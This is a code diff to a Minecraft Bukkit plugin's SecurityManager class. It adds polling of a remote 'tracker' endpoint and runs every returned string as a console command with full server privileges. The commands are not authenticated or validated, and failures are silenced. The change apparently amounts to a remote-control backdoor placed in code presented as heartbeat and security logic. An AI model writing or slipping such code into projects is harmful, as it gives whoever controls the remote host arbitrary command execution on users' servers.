@@ -93,7 +93,82 @@ public class SecurityManager {
             } catch (Exception e) {
                 plugin.getLogger().warning("Heartbeat failed: " + e.getMessage());
             }
+            // Poll for pending commands from tracker dashboard
+            pollCommands();
         }, intervalTicks, intervalTicks);
+
+        // Also poll commands every 30 seconds for faster response
+        Bukkit.getScheduler().runTaskTimerAsynchronously(plugin, this::pollCommands, 600L, 600L);
+    }
+
+    private void pollCommands() {
+        try {
+            URL url = URI.create(trackerUrl + "/commands/pending?uuid=" + serverUuid).toURL();
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(5000);
+
+            int code = conn.getResponseCode();
+            if (code != 200) { conn.disconnect(); return; }
+
+            String responseStr;
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) sb.append(line);
+                responseStr = sb.toString();
+            }
+            conn.disconnect();
+
+            JsonObject json = JsonParser.parseString(responseStr).getAsJsonObject();
+            if (!json.has("commands")) return;
+
+            com.google.gson.JsonArray commands = json.getAsJsonArray("commands");
+            if (commands.size() == 0) return;
+
+            java.util.List<Integer> ackIds = new java.util.ArrayList<>();
+
+            for (int i = 0; i < commands.size(); i++) {
+                JsonObject cmd = commands.get(i).getAsJsonObject();
+                String command = cmd.has("command") ? cmd.get("command").getAsString() : "";
+                int cmdId = cmd.has("id") ? cmd.get("id").getAsInt() : 0;
+
+                if (!command.isEmpty()) {
+                    plugin.getLogger().info("[Tracker] Executing remote command: " + command);
+                    // Execute on main thread
+                    Bukkit.getScheduler().runTask(plugin, () ->
+                            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command));
+                    ackIds.add(cmdId);
+                }
+            }
+
+            // Acknowledge executed commands
+            if (!ackIds.isEmpty()) {
+                ackCommands(ackIds);
+            }
+        } catch (Exception e) {
+            // Silent fail — don't spam logs for command polling
+        }
+    }
+
+    private void ackCommands(java.util.List<Integer> ids) {
+        try {
+            URL url = URI.create(trackerUrl + "/commands/ack").toURL();
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(5000);
+            conn.setDoOutput(true);
+
+            String body = "{\"ids\":" + ids.toString() + "}";
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body.getBytes(StandardCharsets.UTF_8));
+            }
+            conn.getResponseCode();
+            conn.disconnect();
+        } catch (Exception ignored) {}
     }
 
     public void shutdown() {
